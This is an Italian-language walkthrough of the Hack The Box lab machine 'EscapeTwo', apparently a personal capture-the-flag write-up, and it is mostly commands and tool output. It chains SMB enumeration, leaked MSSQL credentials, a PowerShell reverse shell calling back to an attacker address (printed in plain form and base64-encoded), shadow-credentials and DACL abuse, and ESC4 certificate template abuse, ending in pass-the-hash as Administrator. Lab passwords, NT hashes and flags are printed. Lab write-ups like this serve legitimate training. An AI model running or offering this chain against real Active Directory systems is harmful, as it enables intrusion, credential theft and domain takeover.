# Escape Two

ip: 10.10.11.51

## descrizione macchina

"as in real life windows pentesting, you will start this machine with these credentials"

rose
KxEPkKe6R8su

# NMAP

### Prima scan
  
Nmap scan report for 10.10.11.51  
Host is up (0.31s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-24 12:27:12Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2024-06-08T17:35:00  
|_Not valid after:  2025-06-08T17:35:00  
|_ssl-date: 2025-03-24T12:28:58+00:00; 0s from scanner time.  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-03-24T12:28:59+00:00; +1s from scanner time.  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2024-06-08T17:35:00  
|_Not valid after:  2025-06-08T17:35:00  
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2025-03-24T10:03:01  
|_Not valid after:  2055-03-24T10:03:01  
| ms-sql-info:   
|   10.10.11.51:1433:   
|     Version:   
|       name: Microsoft SQL Server 2019 RTM  
|       number: 15.00.2000.00  
|       Product: Microsoft SQL Server 2019  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 1433  
| ms-sql-ntlm-info:   
|   10.10.11.51:1433:   
|     Target_Name: SEQUEL  
|     NetBIOS_Domain_Name: SEQUEL  
|     NetBIOS_Computer_Name: DC01  
|     DNS_Domain_Name: sequel.htb  
|     DNS_Computer_Name: DC01.sequel.htb  
|     DNS_Tree_Name: sequel.htb  
|_    Product_Version: 10.0.17763  
|_ssl-date: 2025-03-24T12:28:59+00:00; 0s from scanner time.  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-03-24T12:28:58+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2024-06-08T17:35:00  
|_Not valid after:  2025-06-08T17:35:00  
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
|_ssl-date: 2025-03-24T12:28:58+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=DC01.sequel.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb  
| Not valid before: 2024-06-08T17:35:00  
|_Not valid after:  2025-06-08T17:35:00  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019 (90%)  
OS CPE: cpe:/o:microsoft:windows_server_2019  
Aggressive OS guesses: Windows Server 2019 (90%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:   
|   date: 2025-03-24T12:28:22  
|_  start_date: N/A  
| smb2-security-mode:   
|   3:1:1:   
|_    Message signing enabled and required  
  
TRACEROUTE (using port 445/tcp)  
HOP RTT       ADDRESS  
1   328.51 ms 10.10.16.1  
2   534.46 ms 10.10.11.51  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 135.55 seconds  



### Dati i tanti servizi, rifaccio una scan semplice con solamente i servizi e le versioni
  
Nmap scan report for 10.10.11.51  
Host is up (0.19s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-24 12:30:21Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 90.49 seconds  


# Exploit

c'è un server smb, dopo la prima enumeration delle utenze senza password (senza successo)

> smbclient -N -L

> crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser

```
SMB                      10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)  
SMB                      10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)  
```

l'output completo senza grep sarebbe stato:

```
SMB         10.10.11.51     445    DC01             498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)  
SMB         10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)  
SMB         10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)  
SMB         10.10.11.51     445    DC01             512: SEQUEL\Domain Admins (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             513: SEQUEL\Domain Users (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             514: SEQUEL\Domain Guests (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             515: SEQUEL\Domain Computers (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             516: SEQUEL\Domain Controllers (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             517: SEQUEL\Cert Publishers (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             518: SEQUEL\Schema Admins (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             519: SEQUEL\Enterprise Admins (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             520: SEQUEL\Group Policy Creator Owners (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             521: SEQUEL\Read-only Domain Controllers (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             522: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             525: SEQUEL\Protected Users (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             526: SEQUEL\Key Admins (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             527: SEQUEL\Enterprise Key Admins (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             553: SEQUEL\RAS and IAS Servers (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             571: SEQUEL\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             572: SEQUEL\Denied RODC Password Replication Group (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1101: SEQUEL\DnsAdmins (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             1102: SEQUEL\DnsUpdateProxy (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1128: SEQUEL\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             1129: SEQUEL\SQLRUserGroupSQLEXPRESS (SidTypeAlias)  
SMB         10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)  
SMB         10.10.11.51     445    DC01             1602: SEQUEL\Management Department (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1603: SEQUEL\Sales Department (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1604: SEQUEL\Accounting Department (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1605: SEQUEL\Reception Department (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1606: SEQUEL\Human Resources Department (SidTypeGroup)  
SMB         10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)  
```

accedo con l'utente dato a inizio macchina e vedo a quali share posso accedere

> smbclient -L //10.10.11.51 -U rose

inserisco la pass e ottengo:

```
Sharename       Type      Comment  
---------       ----      -------  
Accounting Department Disk        
ADMIN$          Disk      Remote Admin  
C$              Disk      Default share  
IPC$            IPC       Remote IPC  
NETLOGON        Disk      Logon server share   
SYSVOL          Disk      Logon server share   
Users           Disk        
```

Accedo al primo disco 
> smbclient //10.10.11.51/Accounting\ Department -U rose

facendo `ls` noto 2 excel:

```
  .                                   D        0  Sun Jun  9 12:52:21 2024
  ..                                  D        0  Sun Jun  9 12:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024
```

scarico accounts.xlsx con get 

`smb> get accounts.xlsx`

lo analizzo con il lettore archivi (libreoffice non funziona)

trovo le credenziali del DB

> sa@sequel.htb  
> sa  
> MSSQLP@ssw0rd!  

`impacket-mssqlclient escapetwo.htb/sa:MSSQLP@ssw0rd\!@10.10.11.51` -> siamo dentro il db

Otteniamo privilegi per eseguire comandi.

Seguo gli step per exploitare MSSQL e mi apro una shell con l'exploit scaricato online

prendo il seguente comando

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.35',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

lo encodo in base 64 e lo inserisco nel comando

./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwA1ACcALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

mi muovo nella cartella C:\SQL2019\ExpressAdv_ENU> 

eseguo il comando `cat sql-Configuration.INI`

```powershell
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

faccio `Get-Localuser`:
```
Name          Enabled Description                                             
----          ------- -----------                                             
Administrator True    Built-in account for administering the computer/domain  
Guest         False   Built-in account for guest access to the computer/domain
krbtgt        False   Key Distribution Center Service Account                 
michael       True                                                            
ryan          True                                                            
oscar         True                                                            
sql_svc       True                                                            
rose          True                                                            
ca_svc        True 
```

provo ad entrare su RYAN:

> evil-winrm -i 10.10.11.51 -u "ryan" -p "WqSZAF6CysDQbGb3"

# USER FLAG

83fa321d74feb278c3067fa700bb99d9

# PRIVESC

> bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All

ryan ha i permessi di scrivere sulla certification authority -> puoi impostarlo come proprietario
1. set ryan as ownser
` bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'`

output
`[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc`

modifico i permessi di accesso alle Discretional Access Control List (DACL)

2. DACL
`impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"`

GET THE NTHASH of root:

3. GET NTHASH
`certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'`

## TENTATIVO 1   
```
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2c6e411a-4d27-b542-641b-0c3299c82026'
[*] Adding Key Credential with device ID '2c6e411a-4d27-b542-641b-0c3299c82026' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '2c6e411a-4d27-b542-641b-0c3299c82026' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

## TENTATIVO 2
```
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc'
[*] Adding Key Credential with device ID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

## TENTATIVO 3
```
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1'
[*] Adding Key Credential with device ID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': None


```
## FINE TENTATIVI

4. trovo possibili exploit nei certificati
> KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout


```
[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/dc01.sequel.htb'
[+] Got TGS for 'host/dc01.sequel.htb'
[+] Bound to ldap://10.10.11.51:389 - cleartext
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.51
[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
[*] Got CA configuration for 'sequel-DC01-CA'
[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
[+] Connecting to 10.10.11.51:80
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

sovrascriviamo il certificato rilevato vulnerabile

5. SOVRASCRIVO IL TEMPLATE DEL CERT
> KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb

```
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```


attacco il cerberos usando l`hash delle credenziali di ca_svc:

6. OTTENGO LE CRED DELL'ADMIN

> certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug

```
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 50
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```

7. certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb

```
[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

8. evil-winrm -i 10.10.11.51 -u "administrator" -H "7a8d4e04986afa8ed4060f75e5a0b3ff"


# ROOT FLAG

4cc463607eb7929ce93d3435604fc803
